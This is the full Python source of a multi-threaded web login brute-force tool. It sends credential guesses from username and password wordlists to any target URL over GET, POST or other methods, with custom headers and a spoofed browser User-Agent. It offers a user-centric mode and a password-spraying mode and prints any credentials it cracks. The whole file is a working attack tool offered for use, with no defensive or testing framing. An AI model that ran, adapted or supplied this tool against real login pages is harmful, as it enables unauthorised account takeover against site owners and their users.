import time
import requests
from concurrent.futures import ThreadPoolExecutor
import argparse
from threading import Lock
import sys

found_lock = Lock()
FOUND_FLAG = False# Global flag if found,turn True

# Real-time progress display
progress_lock = Lock()
current_progress = {
    "user_index": 0,
    "total_users": 0,
    "current_user": "",
    "current_password": "",
    "password_count": 0,
    "mode": "",
    "last_update_time": time.time() # control refresh rate
}

UPDATE_INTERVAL = 0.5 # every 0.5 second refresh

def try_login(target_url, username, password, data_template, custom_headers, HTTP_Method, error_message):
    global FOUND_FLAG

    # 减少锁持有时间
    with progress_lock:
        current_progress["current_user"] = username
        current_progress["current_password"] = password

    # if found, stop
    with found_lock:
        if FOUND_FLAG:
            return

    # prepare data
    current_data = data_template.replace("~USER~", username).replace("~PASS~", password)

    try:
        if HTTP_Method.upper() == "GET":
            response = requests.get(target_url, params=current_data, timeout=5, headers=custom_headers)
        elif HTTP_Method.upper() == "POST":
            response = requests.post(target_url, data=current_data, timeout=5, headers=custom_headers) # prevent freezing
        else:
            # other method like PUT/HEAD
            response = requests.request(HTTP_Method, target_url, data=current_data, timeout=5, headers=custom_headers)

        # determine whether it is successful
        if response.status_code == 200:
            if error_message not in response.text:
                with found_lock:
                    if not FOUND_FLAG:
                        print("\r" + " " * 150 + "\r", end="", flush=True)
                        print(f"\n[!] brute successful! credential is {username}:{password}")
                        FOUND_FLAG = True
                        return True

    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.RequestException:
        pass
    except Exception:
        pass

    return False



def load_passwords(pass_list_path, batch_size=1000):
    # The generator method is used to read passwords, saving memory
    batch = []
    try:
        with open(pass_list_path, "r", encoding="latin-1", errors='ignore') as f:
            for line in f:
                current_pass = line.strip()
                if current_pass:
                    batch.append(current_pass)
                    if len(batch) >= batch_size:
                        yield batch
                        batch = []

            if batch:
                yield batch
    except FileNotFoundError:
        print(f"[X] the password dictionary {pass_list_path} don't found")
        raise

def load_users(userfile):
    # load user list
    try:
        with open(userfile, "r", encoding="utf-8") as f:
            users = [line.strip() for line in f if line.strip()]
        return users
    except FileNotFoundError:
        print(f"[X] the user dictionary {userfile} don't find")
        raise

def print_progress():
    with progress_lock:
        if current_progress["mode"] == "USER":
            progress_msg = (
                f"\r[*] User [{current_progress['user_index']}/{current_progress['total_users']}]: "
                f"{current_progress['current_user']} | "
                f"Password: {current_progress['current_password']:<30}"
            )
        else:  # PASS mode
            progress_msg = (
                f"\r[*] Password Count: {current_progress['password_count']:<8} | "
                f"User: {current_progress['current_user']:<20} | "
                f"Password: {current_progress['current_password']:<30}"
            )
    sys.stdout.write(progress_msg)
    sys.stdout.flush()

def main():
    # --- Set command line parameters ---
    parser = argparse.ArgumentParser(description="Multi-threaded login brute force tool")

    # set parameters
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-P", "--passfile", required=True, help="Password dictionary file")
    parser.add_argument("-t", "--threads", type=int, default=40, help="Number of threads(default:40)")
    parser.add_argument("-d", "--data", required=True, help="POST data format.(e.g. -d \"user=~USER~&pass=~PASS~\")")
    parser.add_argument("-m", "--method", default="POST", help="HTTP Method (default: POST)")
    parser.add_argument("-M","--Mode",default="USER", help="Attack Mode: 'USER' (User-centric) or 'PASS' (Password-centric). Default: USER")
    parser.add_argument("-F","--error_message", help="Error Message(e.g., Login failed)")

    # user  parameters group (mutually exclusive: only one can be selected)
    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument("-U", "--userfile", help="Username dictionary file")
    user_group.add_argument("-n", "--username", help="Single username (e.g., admin)")

    # header
    parser.add_argument("-H", "--header", action='append', help="Custom header (e.g. -H 'cookie: 111')")
    # Analyze the parameters input by user
    args = parser.parse_args()

    # Assign the parameter to the variable
    target_url = args.url
    pass_list_path = args.passfile
    thread_count = args.threads
    data_template = args.data
    HTTP_Method = args.method.upper()
    Mode = args.Mode.upper()
    start_time = time.time()

    print(f"[*] target url:{target_url}")
    print(f"[*] pass wordlist:{pass_list_path}")
    print(f"[*] threads number:{thread_count}")
    print(f"[*] attack mode: {Mode}")
    print(f"[*] start: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}")
    print("-" * 40)

    # Headers procession logic
    final_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    # append header from user input
    if args.header:
        for h in args.header:
            try:
                key, value = h.split(":", 1)
                final_headers[key.strip()] = value.strip()
            except ValueError:
                print(f"[!] Warning: Invalid header format ignored:{h}")

    # Determine whether single-user or multi-user mode
    users = []
    # A, single-user
    if args.username:
        users = [args.username]
    # B, multi-user
    elif args.userfile:
        users = load_users(args.userfile)
        print(f"[*] load {len(users)} user")

    with progress_lock:
        current_progress["total_users"] = len(users)
        current_progress["mode"] = Mode

    error_message = None
    if args.error_message:
        error_message = args.error_message
        print(f"[*] Error message: {error_message}")
    else:
        error_message = "type=\"password\""
        print(f"[*] Error message: {error_message}")

    # User-centric one user -> all password
    if Mode == "USER":
            for index, current_user in enumerate(users, start=1):
                with found_lock:
                    if FOUND_FLAG:
                        print("\r" + " " * 150 + "\r", end="", flush=True)
                        print("task over!")
                        break

                print(f"\n[*] [progress {index}/{len(users)}] Attempting to crack the user:{current_user}")

                with ThreadPoolExecutor(max_workers=thread_count) as executor:
                    try:
                        for password_batch in load_passwords(pass_list_path):
                            with found_lock:
                                if FOUND_FLAG:
                                    break

                            futures = []
                            for current_pass in password_batch:
                                with progress_lock:
                                    current_progress["user_index"] = index
                                    current_progress["current_user"] = current_user
                                    current_progress["current_password"] = current_pass
                                    current_progress["password_count"] += 1
                                    should_update = time.time() - current_progress["last_update_time"] > UPDATE_INTERVAL
                                    if should_update:
                                        current_progress["last_update_time"] = time.time()

                                if should_update:
                                    print_progress()

                                future = executor.submit(try_login, target_url, current_user, current_pass,
                                                         data_template, final_headers, HTTP_Method, error_message)
                                futures.append(future)

                            for future in futures:
                                future.result()

                    except FileNotFoundError:
                        print(f"[X] the password dictionary don't find: {pass_list_path}")
                        return

    # Password-centric one password -> all username
    elif Mode == "PASS":
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            try:
                for pass_index, password_batch in enumerate(load_passwords(pass_list_path)):
                    with found_lock:
                        if FOUND_FLAG:
                            print("\r" + " " * 150 + "\r", end="", flush=True)
                            print("[*] find credentials, stop!")
                            break

                    futures = []
                    for current_pass in password_batch:
                        for current_user in users:
                            with progress_lock:
                                current_progress["current_password"] = current_pass
                                current_progress["current_user"] = current_user
                                current_progress["password_count"] += 1
                                should_update = time.time() - current_progress["last_update_time"] > UPDATE_INTERVAL
                                if should_update:
                                    current_progress["last_update_time"] = time.time()

                            if should_update:
                                print_progress()

                            future = executor.submit(try_login, target_url, current_user, current_pass,
                                                             data_template, final_headers, HTTP_Method, error_message)
                            futures.append(future)

                    for future in futures:
                        future.result()
            except FileNotFoundError:
                print(f"[X] the password dictionary {pass_list_path} don't find")
                return

        with found_lock:
            if not FOUND_FLAG:
                print("\r" + " " * 150 + "\r", end="", flush=True)
                print("\n[*] brute over, don't find credentials")

    elapsed_time = time.time() - start_time
    print(f"\n[*] Total time taken {elapsed_time} seconds")

if __name__ == "__main__":
    main()
